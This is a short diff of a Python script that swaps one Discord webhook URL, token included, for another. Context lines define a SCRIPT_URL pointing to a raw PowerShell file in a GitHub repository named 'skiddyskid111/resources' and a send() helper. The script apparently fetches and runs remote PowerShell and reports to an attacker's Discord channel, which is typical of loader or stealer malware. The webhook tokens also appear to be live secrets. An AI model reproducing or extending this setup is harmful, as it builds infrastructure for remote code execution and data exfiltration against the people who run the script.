@@ -4,7 +4,7 @@ import os
 import requests
 import traceback
 
-WEBHOOK_URL = 'https://discord.com/api/webhooks/1418620647654953144/quGfUxYm_ZNxydSkulCZd2NGHsrHdfIm0h5J9gM5R0FQyrdsQRecWTTMaI3Mff3cWQzU'
+WEBHOOK_URL = 'https://discord.com/api/webhooks/1424476816067793071/X65-fAc3b06XsaQKB_G2JwfNhrkLLc3MQNQ73zsunXj6Q6QqPPbf7D1W7tRke4ztffoK'
 SCRIPT_URL = 'https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/1.ps1'
 
 def send(msg, color=0x00FF00):
